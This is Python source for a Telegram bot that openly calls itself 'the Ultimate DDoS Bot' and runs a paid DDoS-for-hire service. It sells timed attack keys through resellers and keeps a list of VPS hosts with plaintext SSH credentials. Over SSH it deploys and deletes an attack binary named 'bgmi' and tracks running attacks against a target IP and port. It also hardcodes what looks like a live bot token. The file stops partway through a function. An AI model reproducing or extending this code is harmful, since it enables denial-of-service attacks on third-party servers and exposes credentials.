
import os
import time
import logging
from telegram.constants import ParseMode
import asyncio
import random
import json
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, ConversationHandler
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import CallbackQueryHandler
from telegram.ext import ChatMemberHandler
from telegram.helpers import escape_markdown
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ConversationHandler, ContextTypes
import paramiko
from scp import SCPClient
import sys
import subprocess
import threading
from pathlib import Path
import re
import os

# Set your Telegram Bot Token here
TELEGRAM_BOT_TOKEN = "8095931824:AAG2srjhFG4dsUHJIBEoEF1OF-MOtsLY0ls"



def escape_markdown(text: str, version: int = 1) -> str:
    if version == 2:
        escape_chars = r'\_*[]()~`>#+-=|{}.!'
    else:
        escape_chars = r'\_*[]()'
    return re.sub(f'([{re.escape(escape_chars)}])', r'\\\1', text)



# Suppress HTTP request logs
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)

# Logging Configuration
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
)

# Bot management system
BOT_INSTANCES = {}  # Stores running bot processes
BOT_CONFIG_FILE = "bot_configs.json"
BOT_DATA_DIR = "bot_data"  # Directory to store each bot's data

# Bot Configuration
TELEGRAM_BOT_TOKEN = '8095931824:AAG2srjhFG4dsUHJIBEoEF1OF-MOtsLY0ls'
OWNER_ID = 6353114118  # 👈 Put your real Telegram user ID here
CO_OWNERS = []  # List of user IDs for co-owners
OWNER_CONTACT = "Contact to buy keys"
ALLOWED_GROUP_IDS = [-1002327785449]
MAX_THREADS = 1000
max_duration = 120
bot_open = False
OWNER_USERNAME = "SLAYER_OP7"
SPECIAL_MAX_DURATION = 600
SPECIAL_MAX_THREADS = 2000
BOT_START_TIME = time.time()

ACTIVE_VPS_COUNT = 10000  # डिफॉल्ट रूप से 6 VPS इस्तेमाल होंगे
# Display Name Configuration
GROUP_DISPLAY_NAMES = {}  # Key: group_id, Value: display_name
DISPLAY_NAME_FILE = "display_names.json"

# Link Management
LINK_FILE = "links.json"
LINKS = {}

# VPS Configuration
VPS_FILE = "vps.txt"
BINARY_NAME = "bgmi"
BINARY_PATH = f"/home/master/{BINARY_NAME}"
VPS_LIST = []

# Key Prices
KEY_PRICES = {
    "1H": 5,
    "2H": 10,  # Price for 1-hour key
    "3H": 15,  # Price for 1-hour key
    "4H": 20,  # Price for 1-hour key
    "5H": 25,  # Price for 1-hour key
    "6H": 30,  # Price for 1-hour key
    "7H": 35,  # Price for 1-hour key
    "8H": 40,  # Price for 1-hour key
    "9H": 45,  # Price for 1-hour key
    "10H": 50, # Price for 1-hour key
    "1D": 60,  # Price for 1-day key
    "2D": 100,  # Price for 1-day key
    "3D": 160, # Price for 1-day key
    "5D": 250, # Price for 2-day key
    "7D": 320, # Price for 2-day key
    "15D": 700, # Price for 2-day key
    "30D": 1250, # Price for 2-day key
    "60D": 2000, # Price for 2-day key,
}

# Special Key Prices
SPECIAL_KEY_PRICES = {
    "1D": 70,  
    "2D": 130,  # 30 days special key price
    "3D": 250,  # 30 days special key price
    "4D": 300,  # 30 days special key price
    "5D": 400,  # 30 days special key price
    "6D": 500,  # 30 days special key price
    "7D": 550,  # 30 days special key price
    "8D": 600,  # 30 days special key price
    "9D": 750,  # 30 days special key price
    "10D": 800,  # 30 days special key price
    "11D": 850,  # 30 days special key price
    "12D": 900,  # 30 days special key price
    "13D": 950,  # 30 days special key price
    "14D": 1000,  # 30 days special key price
    "15D": 1050,  # 30 days special key price
    "30D": 1500,  # 30 days special key price
}

# Image configuration
START_IMAGES = [
    {
        'url': 'https://sdmntprcentralus.oaiusercontent.com/files/00000000-ca60-61f5-8f19-372aa842ca13/raw?se=2025-05-20T05%3A31%3A20Z&sp=r&sv=2024-08-04&sr=b&scid=f5015f0b-3707-5204-b499-1f10a2e676eb&skoid=add8ee7d-5fc7-451e-b06e-a82b2276cf62&sktid=a48cca56-e6da-484e-a814-9c849652bcb3&skt=2025-05-19T23%3A57%3A36Z&ske=2025-05-20T23%3A57%3A36Z&sks=b&skv=2024-08-04&sig=BlWOfbVNIblyATkE8ddYc1xGbGr6TSWVRsDRJKTTB9g%3D',
        'caption': (
            '🔥 *Welcome to the Ultimate DDoS Bot !*' + '\n\n'
            '💻 *Example:* `20.235.43.9 14533 120A`' + '\n\n'
            '💀 *Bsdk threads ha 100 dalo time 120 dalne ke baad*' + '\n\n'
            '⚠️ *Buy keys from the bot @{BOT_USERNAME}' + '\n\n'
            '⚠️ *JOIN CHANNEL  @ISAGIxCRACKS *' + '\n\n'
        )
    },
    
]

# File to store key data
KEY_FILE = "keys.txt"

# Key System
keys = {}
special_keys = {}
redeemed_users = {}
redeemed_keys_info = {}
feedback_waiting = {}

# Reseller System
resellers = set()
reseller_balances = {}

# Global Cooldown
global_cooldown = 0
last_attack_time = 0

# Track running attacks
running_attacks = {}

# Keyboards
group_user_keyboard = [
    ['/Start', 'Attack'],
    ['Redeem Key', 'Rules'],
    ['🔍 Status', '⏳ Uptime']
]
group_user_markup = ReplyKeyboardMarkup(group_user_keyboard, resize_keyboard=True)

reseller_keyboard = [
    ['/Start', 'Attack', 'Redeem Key'],
    ['Rules', 'Balance', 'Generate Key'],
    ['🔑 Special Key', 'Keys', '⏳ Uptime']
]
reseller_markup = ReplyKeyboardMarkup(reseller_keyboard, resize_keyboard=True)

# Settings menu keyboard with Reset VPS button
settings_keyboard = [
    ['Set Duration', 'Add Reseller'],
    ['Remove Reseller', 'Set Threads'],
    ['Add Coin', 'Set Cooldown'],
    ['Reset VPS', 'Back to Home']
]
settings_markup = ReplyKeyboardMarkup(settings_keyboard, resize_keyboard=True)

# Owner Settings menu keyboard with bot management buttons
owner_settings_keyboard = [
    ['Add Bot', 'Remove Bot'],
    ['Bot List', 'Start Selected Bot'],
    ['Stop Selected Bot', 'Promote'],
    ['🔗 Manage Links', '📢 Broadcast'],
    ['Back to Home']
]
owner_settings_markup = ReplyKeyboardMarkup(owner_settings_keyboard, resize_keyboard=True)

owner_keyboard = [
    ['/Start', 'Attack', 'Redeem Key'],
    ['Rules', 'Settings', 'Generate Key'],
    ['Delete Key', '🔑 Special Key', '⏳ Uptime'],
    ['OpenBot', 'CloseBot', 'Menu'],
    ['⚙️ Owner Settings', '👥 Check Users']
]
owner_markup = ReplyKeyboardMarkup(owner_keyboard, resize_keyboard=True)

co_owner_keyboard = [
    ['/Start', 'Attack', 'Redeem Key'],
    ['Rules', 'Delete Key', 'Generate Key'],
    ['OpenBot', '🔑 Special Key', 'CloseBot'],
    ['Settings', '⏳ Uptime', 'Menu']
]
co_owner_markup = ReplyKeyboardMarkup(co_owner_keyboard, resize_keyboard=True)

# Menu keyboards
owner_menu_keyboard = [
    ['Add Group ID', 'Remove Group ID'],
    ['RE Status', 'VPS Status'],
    ['Add VPS', 'Remove VPS'],
    ['Add Co-Owner', 'Remove Co-Owner'],
    ['Set Display Name', 'Upload Binary'],
    ['Delete Binary', 'Back to Home']  # Added Delete Binary button
]
owner_menu_markup = ReplyKeyboardMarkup(owner_menu_keyboard, resize_keyboard=True)

co_owner_menu_keyboard = [
    ['Add Group ID', 'Remove Group ID'],
    ['RE Status', 'VPS Status'],
    ['Set Display Name', 'Add VPS'],
    ['Back to Home', 'Upload Binary']
]
co_owner_menu_markup = ReplyKeyboardMarkup(co_owner_menu_keyboard, resize_keyboard=True)

# Conversation States
GET_DURATION = 1
GET_KEY = 2
GET_ATTACK_ARGS = 3
GET_SET_DURATION = 4
GET_SET_THREADS = 5
GET_DELETE_KEY = 6
GET_RESELLER_ID = 7
GET_REMOVE_RESELLER_ID = 8
GET_ADD_COIN_USER_ID = 9
GET_ADD_COIN_AMOUNT = 10
GET_SET_COOLDOWN = 11
GET_SPECIAL_KEY_DURATION = 12
GET_SPECIAL_KEY_FORMAT = 13
ADD_GROUP_ID = 14
REMOVE_GROUP_ID = 15
MENU_SELECTION = 16
GET_RESELLER_INFO = 17
GET_VPS_INFO = 18
GET_VPS_TO_REMOVE = 19
CONFIRM_BINARY_UPLOAD = 20
GET_ADD_CO_OWNER_ID = 21
GET_REMOVE_CO_OWNER_ID = 22
GET_DISPLAY_NAME = 23
GET_GROUP_FOR_DISPLAY_NAME = 24
GET_BOT_TOKEN = 25
GET_OWNER_USERNAME = 26
SELECT_BOT_TO_START = 27
SELECT_BOT_TO_STOP = 28
CONFIRM_BINARY_DELETE = 29
GET_LINK_NUMBER = 30
GET_LINK_URL = 31
GET_BROADCAST_MESSAGE = 31
GET_VPS_COUNT = 32

def get_uptime():
    uptime_seconds = int(time.time() - BOT_START_TIME)
    days, remainder = divmod(uptime_seconds, 86400)
    hours, remainder = divmod(remainder, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}d {hours}h {minutes}m {seconds}s"

def get_display_name(group_id=None):
    """Returns the current display name for the owner in specific group or default"""
    if group_id is None:
        return GROUP_DISPLAY_NAMES.get('default', f"@{OWNER_USERNAME}")
    return GROUP_DISPLAY_NAMES.get(group_id, GROUP_DISPLAY_NAMES.get('default', f"@{OWNER_USERNAME}"))

async def owner_settings(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can access these settings!*", parse_mode='Markdown')
        return
    
    # Make sure current_display_name is defined here or before this
    current_display_name = get_display_name_from_update(update)
    
    escaped_display_name = escape_markdown(current_display_name)
    
    await update.message.reply_text(
        f"⚙️ *Owner Settings Menu*\n\n"
        f"Select an option below:\n\n"
        f"👑 *Bot Owner:* {escaped_display_name}",
        parse_mode='Markdown',
        reply_markup=owner_settings_markup
    )



async def set_display_name(update: Update, new_name: str, group_id=None):
    """Updates the display name for specific group or default"""
    if group_id is not None:
        GROUP_DISPLAY_NAMES[group_id] = new_name
    else:
        GROUP_DISPLAY_NAMES['default'] = new_name
    
    with open(DISPLAY_NAME_FILE, 'w') as f:
        json.dump(GROUP_DISPLAY_NAMES, f)
    
    if update:
        await update.message.reply_text(
            f"✅ Display name updated to: {new_name}" + 
            (f" for group {group_id}" if group_id else " as default name"),
            parse_mode='Markdown'
        )

def load_vps():
    global VPS_LIST
    VPS_LIST = []
    if os.path.exists(VPS_FILE):
        with open(VPS_FILE, 'r') as f:
            for line in f.readlines():
                line = line.strip()
                if line and len(line.split(',')) == 3:  # IP,username,password फॉर्मेट चेक करें
                    VPS_LIST.append(line.split(','))

async def set_vps_count(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ Only owner or co-owners can set VPS count!", parse_mode='Markdown')
        return ConversationHandler.END
    
    await update.message.reply_text(
        f"⚠️ Enter number of VPS to use (current: {ACTIVE_VPS_COUNT}, available: {len(VPS_LIST)}):",
        parse_mode='Markdown'
    )
    return GET_VPS_COUNT

async def set_vps_count_input(update: Update, context: CallbackContext):
    global ACTIVE_VPS_COUNT
    try:
        count = int(update.message.text)
        if 1 <= count <= len(VPS_LIST):
            ACTIVE_VPS_COUNT = count
            await update.message.reply_text(
                f"✅ Active VPS set to {ACTIVE_VPS_COUNT}",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text(
                f"❌ Please enter between 1 and {len(VPS_LIST)}",
                parse_mode='Markdown'
            )
    except ValueError:
        await update.message.reply_text("❌ Please enter a valid number!", parse_mode='Markdown')
    return ConversationHandler.END

# Add this function
async def promote(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only owner can promote!*", parse_mode='Markdown')
        return
    
    # Create the promotion message using the stored links
    promotion_message = (
        "🔰 *Join our groups for more information, free keys, and hosting details!*\n\n"
        "Click the buttons below to join:"
    )
    
    # Create buttons dynamically based on available links
    keyboard = []
    if 'link_1' in LINKS and LINKS['link_1']:
        keyboard.append([InlineKeyboardButton("Join Group 1", url=LINKS['link_1'])])
    if 'link_2' in LINKS and LINKS['link_2']:
        keyboard.append([InlineKeyboardButton("Join Group 2", url=LINKS['link_2'])])
    if 'link_3' in LINKS and LINKS['link_3']:
        keyboard.append([InlineKeyboardButton("Join Group 3", url=LINKS['link_3'])])
    if 'link_4' in LINKS and LINKS['link_4']:
        keyboard.append([InlineKeyboardButton("Join Group 4", url=LINKS['link_4'])])
    
    # If no links are set, show a message
    if not keyboard:
        await update.message.reply_text("ℹ️ No links have been set up yet. Use the 'Manage Links' option to add links.")
        return
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Send to current chat first
    await update.message.reply_text(
        promotion_message,
        parse_mode='Markdown',
        reply_markup=reply_markup
    )
    
    # Track success/failure
    success_count = 0
    fail_count = 0
    group_success = 0
    private_success = 0
    
    # Get all chats the bot is in
    all_chats = set()
    
    # Add allowed groups
    for group_id in ALLOWED_GROUP_IDS:
        all_chats.add(group_id)
    
    # Add tracked private chats (users who have interacted with bot)
    if 'users_interacted' in context.bot_data:
        for user_id in context.bot_data['users_interacted']:
            all_chats.add(user_id)
    
    # Send promotion to all chats
    for chat_id in all_chats:
        try:
            await context.bot.send_message(
                chat_id=chat_id,
                text=promotion_message,
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
            success_count += 1
            
            # Track group vs private
            try:
                chat = await context.bot.get_chat(chat_id)
                if chat.type in ['group', 'supergroup']:
                    group_success += 1
                else:
                    private_success += 1
            except:
                pass
                
            await asyncio.sleep(0.5)  # Rate limiting
        except Exception as e:
            logging.error(f"Failed to send promotion to {chat_id}: {str(e)}")
            fail_count += 1
    
    # Send report
    await update.message.reply_text(
        f"📊 *Promotion Results*\n\n"
        f"✅ Successfully sent to: {success_count} chats\n"
        f"❌ Failed to send to: {fail_count} chats\n\n"
        f"• Groups: {group_success}\n"
        f"• Private chats: {private_success}",
        parse_mode='Markdown'
    )

def load_links():
    """Load links from file"""
    global LINKS
    if os.path.exists(LINK_FILE):
        try:
            with open(LINK_FILE, 'r') as f:
                LINKS = json.load(f)
        except (json.JSONDecodeError, ValueError):
            LINKS = {}

def save_links():
    """Save links to file"""
    with open(LINK_FILE, 'w') as f:
        json.dump(LINKS, f)

async def manage_links(update: Update, context: CallbackContext):
    """Show link management menu"""
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner can manage links!", parse_mode='Markdown')
        return
    
    current_links_text = (
        "🔗 *Link Management*\n\n"
        "Current Links:\n"
        "1. Link 1\n"
        "2. Link 2\n"
        "3. Link 3\n"
        "4. Link 4\n\n"
        "Enter the number (1, 2, 3, or 4) of the link you want to replace:"
    )
    
    escaped_text = escape_markdown(current_links_text, version=2)
    
    await update.message.reply_text(
        escaped_text,
        parse_mode='MarkdownV2'
    )
    return GET_LINK_NUMBER

async def get_link_number(update: Update, context: CallbackContext):
    """Get which link number to update"""
    try:
        link_num = int(update.message.text)
        if link_num not in [1, 2, 3, 4]:
            raise ValueError
        
        context.user_data['editing_link'] = f"link_{link_num}"
        await update.message.reply_text(
            f"⚠️ Enter new URL for link {link_num}:",
            parse_mode='Markdown'
        )
        return GET_LINK_URL
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid input! Please enter 1, 2, 3, or 4.",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

async def get_link_url(update: Update, context: CallbackContext):
    if 'editing_link' not in context.user_data:
        return ConversationHandler.END
    
    link_key = context.user_data['editing_link']
    new_url = update.message.text.strip()
    
    if not (new_url.startswith('http://') or new_url.startswith('https://')):
        await update.message.reply_text("❌ Invalid URL! Must start with http:// or https://")
        return ConversationHandler.END
    
    LINKS[link_key] = new_url
    save_links()
    
    link_num = link_key.split('_')[1]
    text = f"✅ Link {link_num} updated successfully!\nNew URL: `{new_url}`"
    
    escaped_text = escape_markdown(text, version=2)
    
    await update.message.reply_text(
        escaped_text,
        parse_mode='MarkdownV2'
    )

    
    # Clear the editing state
    context.user_data.pop('editing_link', None)
    return ConversationHandler.END


async def broadcast_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can broadcast messages!*", parse_mode='Markdown')
        return ConversationHandler.END
    
    await update.message.reply_text(
        "⚠️ *Enter the message you want to broadcast to all channels, groups and private chats:*",
        parse_mode='Markdown'
    )
    return GET_BROADCAST_MESSAGE

async def broadcast_message(update: Update, context: CallbackContext):
    message = update.message.text
    
    # Track success/failure
    success_count = 0
    fail_count = 0
    group_success = 0
    private_success = 0
    
    # Get all chats the bot is in
    all_chats = set()
    
    # Add allowed groups
    for group_id in ALLOWED_GROUP_IDS:
        all_chats.add(group_id)
    
    # Add tracked private chats (users who have interacted with bot)
    if 'users_interacted' in context.bot_data:
        for user_id in context.bot_data['users_interacted']:
            all_chats.add(user_id)
    
    # Send broadcast to all chats
    for chat_id in all_chats:
        try:
            await context.bot.send_message(
                chat_id=chat_id,
                text=message,
                parse_mode='Markdown'
            )
            success_count += 1
            
            # Track group vs private
            try:
                chat = await context.bot.get_chat(chat_id)
                if chat.type in ['group', 'supergroup']:
                    group_success += 1
                else:
                    private_success += 1
            except:
                pass
                
            await asyncio.sleep(0.5)  # Rate limiting
        except Exception as e:
            logging.error(f"Failed to send broadcast to {chat_id}: {str(e)}")
            fail_count += 1
    
    # Send report
    await update.message.reply_text(
        f"📊 *Broadcast Results*\n\n"
        f"✅ Successfully sent to: {success_count} chats\n"
        f"❌ Failed to send to: {fail_count} chats\n\n"
        f"• Groups: {group_success}\n"
        f"• Private chats: {private_success}",
        parse_mode='Markdown'
    )
    return ConversationHandler.END

def load_display_name():
    """Loads the display names from file"""
    global GROUP_DISPLAY_NAMES
    if os.path.exists(DISPLAY_NAME_FILE):
        try:
            with open(DISPLAY_NAME_FILE, 'r') as f:
                GROUP_DISPLAY_NAMES = json.load(f)
            new_dict = {}
            for k, v in GROUP_DISPLAY_NAMES.items():
                try:
                    if k != 'default':
                        new_dict[int(k)] = v
                    else:
                        new_dict[k] = v
                except ValueError:
                    new_dict[k] = v
            GROUP_DISPLAY_NAMES = new_dict
        except (json.JSONDecodeError, ValueError):
            GROUP_DISPLAY_NAMES = {'default': f"@{OWNER_USERNAME}"}
    else:
        GROUP_DISPLAY_NAMES = {'default': f"@{OWNER_USERNAME}"}

def load_keys():
    if not os.path.exists(KEY_FILE):
        return

    with open(KEY_FILE, "r") as file:
        for line in file:
            key_type, key_data = line.strip().split(":", 1)
            if key_type == "ACTIVE_KEY":
                parts = key_data.split(",")
                if len(parts) == 2:
                    key, expiration_time = parts
                    keys[key] = {
                        'expiration_time': float(expiration_time),
                        'generated_by': None
                    }
                elif len(parts) == 3:
                    key, expiration_time, generated_by = parts
                    keys[key] = {
                        'expiration_time': float(expiration_time),
                        'generated_by': int(generated_by)
                    }
            elif key_type == "REDEEMED_KEY":
                key, generated_by, redeemed_by, expiration_time = key_data.split(",")
                redeemed_users[int(redeemed_by)] = float(expiration_time)
                redeemed_keys_info[key] = {
                    'generated_by': int(generated_by),
                    'redeemed_by': int(redeemed_by)
                }
            elif key_type == "SPECIAL_KEY":
                key, expiration_time, generated_by = key_data.split(",")
                special_keys[key] = {
                    'expiration_time': float(expiration_time),
                    'generated_by': int(generated_by)
                }
            elif key_type == "REDEEMED_SPECIAL_KEY":
                key, generated_by, redeemed_by, expiration_time = key_data.split(",")
                redeemed_users[int(redeemed_by)] = {
                    'expiration_time': float(expiration_time),
                    'is_special': True
                }
                redeemed_keys_info[key] = {
                    'generated_by': int(generated_by),
                    'redeemed_by': int(redeemed_by),
                    'is_special': True
                }

def save_keys():
    with open(KEY_FILE, "w") as file:
        for key, key_info in keys.items():
            if key_info['expiration_time'] > time.time():
                file.write(f"ACTIVE_KEY:{key},{key_info['expiration_time']},{key_info['generated_by']}\n")

        for key, key_info in special_keys.items():
            if key_info['expiration_time'] > time.time():
                file.write(f"SPECIAL_KEY:{key},{key_info['expiration_time']},{key_info['generated_by']}\n")

        for key, key_info in redeemed_keys_info.items():
            user_id = key_info['redeemed_by']
            if user_id in redeemed_users:
                expiration_info = redeemed_users[user_id]
                if 'is_special' in key_info and key_info['is_special']:
                    # redeemed_users[user_id] can be dict or float; handle both
                    if isinstance(expiration_info, dict):
                        expiration_time = expiration_info.get('expiration_time', 0)
                    else:
                        expiration_time = expiration_info
                    file.write(f"REDEEMED_SPECIAL_KEY:{key},{key_info['generated_by']},{user_id},{expiration_time}\n")
                else:
                    # normal keys store expiration as float
                    if isinstance(expiration_info, dict):
                        expiration_time = expiration_info.get('expiration_time', 0)
                    else:
                        expiration_time = expiration_info
                    file.write(f"REDEEMED_KEY:{key},{key_info['generated_by']},{user_id},{expiration_time}\n")


def load_bot_configs():
    """Load bot configurations from file"""
    if not os.path.exists(BOT_CONFIG_FILE):
        return []
    
    try:
        with open(BOT_CONFIG_FILE, 'r') as f:
            return json.load(f)
    except (json.JSONDecodeError, ValueError):
        return []

def save_bot_configs(configs):
    """Save bot configurations to file"""
    with open(BOT_CONFIG_FILE, 'w') as f:
        json.dump(configs, f)

def load_vps():
    global VPS_LIST
    if os.path.exists(VPS_FILE):
        with open(VPS_FILE, 'r') as f:
            VPS_LIST = [line.strip().split(',') for line in f.readlines()]

def save_vps():
    with open(VPS_FILE, 'w') as f:
        for vps in VPS_LIST:
            f.write(','.join(vps) + '\n')

def is_allowed_group(update: Update):
    chat = update.effective_chat
    return chat.type in ['group', 'supergroup'] and chat.id in ALLOWED_GROUP_IDS

def is_owner(update: Update):
    return update.effective_user.id == OWNER_ID


def is_co_owner(update: Update):
    return update.effective_user.id in CO_OWNERS

def is_reseller(update: Update):
    return update.effective_user.id in resellers

def is_authorized_user(update: Update):
    return is_owner(update) or is_co_owner(update) or is_reseller(update)

def get_random_start_image():
    return random.choice(START_IMAGES)

async def reset_vps(update: Update, context: CallbackContext):
    """Reset all busy VPS to make them available again"""
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ *Only owner or co-owners can reset VPS!*", parse_mode='Markdown')
        return
    
    global running_attacks
    
    # Count how many VPS are busy
    busy_count = len(running_attacks)
    
    if busy_count == 0:
        await update.message.reply_text("ℹ️ *No VPS are currently busy.*", parse_mode='Markdown')
        return
    
    # Clear all running attacks
    running_attacks.clear()
    
    current_display_name = get_display_name_from_update(update)
    
    await update.message.reply_text(
        f"✅ *Reset {busy_count} busy VPS - they are now available for new attacks!*\n\n"
        f"👑 *Bot Owner:* {current_display_name}",
        parse_mode='Markdown'
    )

async def add_bot_instance(update: Update, context: CallbackContext):
    """Add a new bot instance"""
    if not is_owner(update):
        await update.message.reply_text("❌ Only owner can add bot instances!", parse_mode='Markdown')
        return ConversationHandler.END
    
    await update.message.reply_text(
        "⚠️ Enter the new bot token:",
        parse_mode='Markdown'
    )
    return GET_BOT_TOKEN

async def show_users(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can check users!*", parse_mode='Markdown')
        return
    
    try:
        # Get owner info
        try:
            owner_chat = await context.bot.get_chat(OWNER_USERNAME)
            owner_info = f"👑 Owner: {owner_chat.full_name} (@{owner_chat.username if owner_chat.username else 'N/A'})"
        except Exception as e:
            owner_info = f"👑 Owner: @{OWNER_USERNAME} (Could not fetch details)"
        
        # Get co-owners info
        co_owners_info = []
        for co_owner_id in CO_OWNERS:
            try:
                co_owner_chat = await context.bot.get_chat(co_owner_id)
                co_owners_info.append(
                    f"🔹 Co-Owner: {co_owner_chat.full_name} (@{co_owner_chat.username if co_owner_chat.username else 'N/A'})"
                )
            except Exception as e:
                co_owners_info.append(f"🔹 Co-Owner: ID {co_owner_id} (Could not fetch details)")
        
        # Get resellers info
        resellers_info = []
        for reseller_id in resellers:
            try:
                reseller_chat = await context.bot.get_chat(reseller_id)
                balance = reseller_balances.get(reseller_id, 0)
                resellers_info.append(
                    f"🔸 Reseller: {reseller_chat.full_name} (@{reseller_chat.username if reseller_chat.username else 'N/A'}) - Balance: {balance} coins"
                )
            except Exception as e:
                resellers_info.append(f"🔸 Reseller: ID {reseller_id} (Could not fetch details)")
        
        # Compile the message
        message_parts = [
            "📊 *User Information*",
            "",
            owner_info,
            "",
            "*Co-Owners:*",
            *co_owners_info,
            "",
            "*Resellers:*",
            *resellers_info
        ]
        
        message = "\n".join(message_parts)
        
        # Split message if too long
        if len(message) > 4000:
            parts = [message[i:i+4000] for i in range(0, len(message), 4000)]
            for part in parts:
                await update.message.reply_text(part, parse_mode='Markdown')
        else:
            await update.message.reply_text(message, parse_mode='Markdown')
            
    except Exception as e:
        logging.error(f"Error in show_users: {str(e)}", exc_info=True)
        await update.message.reply_text(
            "❌ *An error occurred while fetching user information.*",
            parse_mode='Markdown'
        )   

async def add_bot_token(update: Update, context: CallbackContext):
    """Get bot token for new instance"""
    token = update.message.text.strip()
    context.user_data['new_bot_token'] = token
    
    await update.message.reply_text(
        "⚠️ Enter the owner username for this bot:",
        parse_mode='Markdown'
    )
    return GET_OWNER_USERNAME
    
async def delete_binary_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ Only owner or co-owners can delete binaries!", parse_mode='Markdown')
        return ConversationHandler.END
    
    current_display_name = get_display_name_from_update(update)
    
    await update.message.reply_text(
        f"⚠️ Are you sure you want to delete {BINARY_NAME} from all VPS?\n\n"
        f"Type 'YES' to confirm or anything else to cancel.\n\n"
        f"👑 *Bot Owner:* {current_display_name}",
        parse_mode='Markdown'
    )
    return CONFIRM_BINARY_DELETE

async def delete_binary_confirm(update: Update, context: CallbackContext):
    confirmation = update.message.text.strip().upper()
    
    if confirmation != 'YES':
        await update.message.reply_text("❌ Binary deletion canceled.", parse_mode='Markdown')
        return ConversationHandler.END
    
    if not VPS_LIST:
        await update.message.reply_text("❌ No VPS configured!", parse_mode='Markdown')
        return ConversationHandler.END
    
    message = await update.message.reply_text(
        f"⏳ Starting {BINARY_NAME} binary deletion from all VPS...\n\n",
        parse_mode='Markdown'
    )
    
    success_count = 0
    fail_count = 0
    results = []
    
    for i, vps in enumerate(VPS_LIST):
        ip, username, password = vps
        try:
            # Create SSH client
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password, timeout=10)
            
            # Define the binary path
            binary_path = f"/home/master/{BINARY_NAME}"
            
            try:
                # Check if binary exists
                stdin, stdout, stderr = ssh.exec_command(f'ls {binary_path} 2>/dev/null || echo "Not found"')
                output = stdout.read().decode().strip()
                
                if output == "Not found":
                    results.append(f"ℹ️ {i+1}. {ip} - Binary not found")
                    continue
                
                # Delete the binary
                ssh.exec_command(f'rm -f {binary_path}')
                
                # Verify deletion
                stdin, stdout, stderr = ssh.exec_command(f'ls {binary_path} 2>/dev/null || echo "Deleted"')
                if "Deleted" not in stdout.read().decode():
                    raise Exception("Deletion verification failed")
                
                results.append(f"✅ {i+1}. {ip} - Successfully deleted")
                success_count += 1
                
            except Exception as e:
                results.append(f"❌ {i+1}. {ip} - Failed: {str(e)}")
                fail_count += 1
            
            ssh.close()
            
        except Exception as e:
            results.append(f"❌ {i+1}. {ip} - Connection Failed: {str(e)}")
            fail_count += 1
    
    # Send results
    result_text = "\n".join(results)
    current_display_name = get_display_name_from_update(update)
    
    await message.edit_text(
        f"🗑️ {BINARY_NAME} Binary Deletion Results:\n\n"
        f"✅ Success: {success_count}\n"
        f"❌ Failed: {fail_count}\n\n"
        f"{result_text}\n\n"
        f"👑 *Bot Owner:* {current_display_name}",
        parse_mode='Markdown'
    )
    
    return ConversationHandler.END

async def add_owner_username(update: Update, context: CallbackContext):
    """Get owner username and start new bot instance"""
    owner_username = update.message.text.strip()
    token = context.user_data['new_bot_token']
    
    # Load existing configs
    configs = load_bot_configs()
    
    # Check if token already exists
    if any(c['token'] == token for c in configs):
        await update.message.reply_text(
            "❌ This bot token is already configured!",
            parse_mode='Markdown'
        )
        return ConversationHandler.END
    
    # Add new config
    new_config = {
        'token': token,
        'owner_username': owner_username,
        'active': False
    }
    configs.append(new_config)
    save_bot_configs(configs)
    
    # Start the new bot instance
    process = subprocess.Popen(
        [sys.executable, str(Path(__file__).resolve()), "--token", token, "--owner", owner_username],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    
    BOT_INSTANCES[token] = process
    new_config['active'] = True
    save_bot_configs(configs)
    
    # Update the display name for this bot instance
    GROUP_DISPLAY_NAMES['default'] = f"@{owner_username}"
    with open(DISPLAY_NAME_FILE, 'w') as f:
        json.dump(GROUP_DISPLAY_NAMES, f)
    
    # Escape Markdown characters in the token display
    display_token = escape_markdown(token[:10] + "...", version=2)
    display_username = escape_markdown(owner_username, version=2)
    
    await update.message.reply_text(
        f"✅ New bot instance added and started!\n\n"
        f"Token: `{display_token}`\n"
        f"Owner: @{display_username}\n\n"
        f"Use /stopbot_{len(configs)-1} to stop this instance.",
        parse_mode='MarkdownV2'
    )
    return ConversationHandler.END
    
async def show_running_attacks(update: Update, context: CallbackContext):
    if not running_attacks:
        await update.message.reply_text("ℹ️ No attacks currently running", parse_mode='Markdown')
        return
    
    message = "🔥 *Currently Running Attacks:*\n\n"
    unique_targets = {}  # Track unique targets to avoid duplicates
    
    for attack_id, attack_info in running_attacks.items():
        target = attack_id.split('-')[0]  # Extract IP:Port (assuming format is "IP:PORT-UUID")
        
        # If target already processed, skip
        if target in unique_targets:
            continue
        
        # Store target to avoid duplicates
        unique_targets[target] = True
        
        elapsed = int(time.time() - attack_info['start_time'])
        remaining = max(0, attack_info['duration'] - elapsed)
        
        message += (
            f"🎯 Target: `{target}`\n"
            f"⏱️ Elapsed: `{elapsed}s` | Remaining: `{remaining}s`\n"
            f"🧵 Threads: `{SPECIAL_MAX_THREADS if attack_info['is_special'] else MAX_THREADS}`\n\n"
        )
    
